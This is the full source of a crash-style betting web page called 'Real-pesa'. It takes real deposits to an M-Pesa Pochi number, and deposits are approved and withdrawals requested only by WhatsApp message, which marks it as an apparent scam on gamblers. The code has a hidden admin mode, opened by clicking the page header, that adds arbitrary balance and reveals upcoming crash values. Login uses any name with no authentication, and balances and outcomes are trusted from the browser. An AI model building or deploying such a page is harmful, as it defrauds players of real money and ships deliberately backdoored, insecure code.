<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Real-pesa | Official</title>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
<style>
:root{--p:#2e7d32;--m:#66bb6a;--d:#0a0a0a;--r:#ff5252;--g:#1a1a1a;}body{font-family:'Segoe UI',sans-serif;margin:0;background:var(--d);color:#fff;text-align:center;overflow-x:hidden;}
header{background:linear-gradient(to bottom, var(--p), #1b5e20);padding:20px;font-weight:bold;cursor:pointer;}.logo{font-size:1.5rem;letter-spacing:2px;text-shadow:2px 2px #000;}
#login-scr{position:fixed;top:0;left:0;width:100%;height:100%;background:var(--d);z-index:100;display:flex;flex-direction:column;justify-content:center;align-items:center;}
.hist{background:var(--g);padding:10px;display:flex;justify-content:center;gap:8px;font-size:0.75rem;border-bottom:1px solid #333;}
.h-item{background:#444;padding:4px 10px;border-radius:15px;color:var(--m);font-weight:bold;}.game{background:radial-gradient(circle, #222 0%, #000 100%);margin:15px;height:160px;border-radius:15px;border:1px solid #444;display:flex;flex-direction:column;justify-content:center;}
#mult{font-size:4rem;font-weight:bold;transition:0.05s;}.ctrl{padding:20px;background:var(--g);margin:15px;border-radius:20px;border:1px solid #333;}
input{width:80%;padding:12px;margin:8px 0;border-radius:10px;border:1px solid #444;background:#111;color:#fff;}
.btn{width:95%;padding:18px;border:none;border-radius:12px;font-weight:bold;font-size:1.2rem;cursor:pointer;margin-bottom:12px;text-transform:uppercase;}
.bet{background:var(--m);color:#fff;}.cash{background:#fbc02d;color:#000;display:none;}.wd-btn{background:#25d366;color:#fff;font-size:0.9rem;padding:12px;}.dep-btn{background:var(--p);color:#fff;font-size:0.9rem;padding:12px;}
.tx-list{margin:15px;background:var(--g);padding:15px;border-radius:15px;border:1px solid #333;text-align:left;}
.tx-item{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #222;font-size:0.8rem;}
.win-c{color:var(--m);}.loss-c{color:var(--r);}
.footer-box{background: #1a1a1a; padding: 15px; border-top: 1px solid #333; margin-top: 20px;}
</style></head><body>
<audio id="bgMusic" loop><source src="music.mp3" type="audio/mpeg"></audio>
<div id="login-scr">
    <h2>REAL-PESA</h2>
    <p style="color: #66bb6a; font-size: 0.8rem; margin-bottom: 20px;">Enter any name to start playing</p>
    <input type="text" id="u-name" placeholder="Enter Username" required>
    <button class="btn bet" onclick="login()">START PLAYING</button>
</div>
<header onclick="showAdmin()"><div class="logo">REAL-PESA</div></header>
<div class="hist" id="hist"><span>History:</span></div>
<div class="game"><div id="mult">1.00x</div><div id="stat" style="color:#aaa;font-size:0.8rem;">READY</div></div>
<div class="ctrl">
    <div style="margin-bottom:10px;color:var(--m);">Wallet: <span id="bal" style="font-weight:bold;">KES 0.00</span></div>
    <input type="number" id="amt" placeholder="Bet Amount">
    <button id="betBtn" class="btn bet" onclick="placeBet()">Place Bet</button>
    <button id="cashBtn" class="btn cash" onclick="cashOut()">CASH OUT</button>
    <div style="display:flex;gap:10px;"><button class="btn dep-btn" style="flex:1;" onclick="deposit()">Deposit</button><button class="btn wd-btn" style="flex:1;" onclick="withdraw()">Withdraw</button></div>
</div>
<div class="tx-list"><div style="font-weight:bold;margin-bottom:10px;color:var(--m);">Recent Transactions</div><div id="tx-data"></div></div>
<div class="footer-box">
    <div style="color: #66bb6a; font-weight: bold; font-size: 0.9rem;">OFFICIAL POCHI LA BIASHARA</div>
    <div style="font-size: 1.1rem; margin: 5px 0;">0797097831</div>
    <div style="font-size: 0.7rem; color: #888;">Send funds then WhatsApp confirmed message for approval.</div>
</div>
<script>
// --- YOUR FIREBASE CONFIG FROM GOOGLE CONSOLE ---
const firebaseConfig = {
  apiKey: "YOUR_KEY",
  authDomain: "YOUR_DOMAIN",
  projectId: "YOUR_ID",
  storageBucket: "YOUR_BUCKET",
  appId: "YOUR_APP_ID"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

let m=1.0, isFlying=false, myBet=0, h=[], iv, wallet=0, nextCrash=0, isAdmin=false, txs=[], currentUser="";
const x=document.getElementById('mult'), s=document.getElementById('stat'), b=document.getElementById('betBtn'), cb=document.getElementById('cashBtn'), bl=document.getElementById('bal'), td=document.getElementById('tx-data'), music=document.getElementById('bgMusic');

async function login() {
    let name = document.getElementById('u-name').value.trim();
    if (name.length < 2) { alert("Please enter a username."); return; }
    currentUser = name;
    const docRef = db.collection("players").doc(currentUser);
    const doc = await docRef.get();
    if (doc.exists) {
        wallet = doc.data().balance;
        txs = doc.data().transactions || [];
    } else {
        await docRef.set({ username: name, balance: 0, transactions: [] });
        wallet = 0;
    }
    document.getElementById('login-scr').style.display='none';
    music.play().catch(()=>{}); 
    loop();
    db.collection("players").doc(currentUser).onSnapshot((doc) => { if(doc.exists) { wallet = doc.data().balance; bl.innerText="KES "+wallet.toFixed(2); renderTxs(); }});
}

async function updateDb() { await db.collection("players").doc(currentUser).update({ balance: wallet, transactions: txs }); }
function renderTxs(){ td.innerHTML = txs.map(t => `<div class="tx-item"><span>${t.type}</span><span class="${t.amt >=0?'win-c':'loss-c'}">KES ${t.amt}</span></div>`).join(''); }
async function addTx(type, amt){ txs.unshift({type: type, amt: amt}); if(txs.length > 5) txs.pop(); await updateDb(); }
function showAdmin(){ isAdmin=!isAdmin; let cmd = prompt(isAdmin?"Admin Active. Type 'add':":"OFF"); if(cmd==="add"){ let a=parseFloat(prompt("Amount?")); wallet += a; addTx("Admin Deposit", a); } }
function addH(v){h.unshift(v);if(h.length>6)h.pop();let html='<span>History:</span>';h.forEach(i=>{html+=`<span class="h-item">${i}x</span>`});document.getElementById('hist').innerHTML=html;}
function loop(){ isFlying=true; m=1.0; x.style.color="#fff"; nextCrash = (Math.random()*7+1.05).toFixed(2); if(isAdmin) s.innerText = "PRED: " + nextCrash + "x";
    iv=setInterval(()=>{ m+=0.01; x.innerText=m.toFixed(2)+"x"; if(m>=nextCrash){ clearInterval(iv); isFlying=false; addH(m.toFixed(2)); x.innerText="FLEW AWAY!"; x.style.color="var(--r)"; b.style.display="block"; cb.style.display="none"; myBet=0; setTimeout(loop, 4000); } },100); }
async function placeBet(){ let a=parseFloat(document.getElementById('amt').value)||10; if(wallet < a){ alert("Low Balance!"); return; } myBet=a; wallet -= a; await addTx("Place Bet", -a); b.style.display="none"; cb.style.display="block"; }
async function cashOut(){ if(myBet>0 && isFlying){ let win = (myBet * m); wallet += win; await addTx("Won Round", win.toFixed(0)); b.style.display="block"; cb.style.display="none"; myBet=0; alert("Won KES "+win.toFixed(2)); } }
function deposit(){ alert("PAY TO POCHI: 0797097831\n\nSend WhatsApp message for approval."); window.location.href=`https://wa.me/254797097831?text=Deposit%20Name:%20${currentUser}`; }
function withdraw(){ window.location.href=`https://wa.me/254797097831?text=Withdraw%20Request:%20KES%20${wallet}%20Name:%20${currentUser}`; }
</script></body></html>
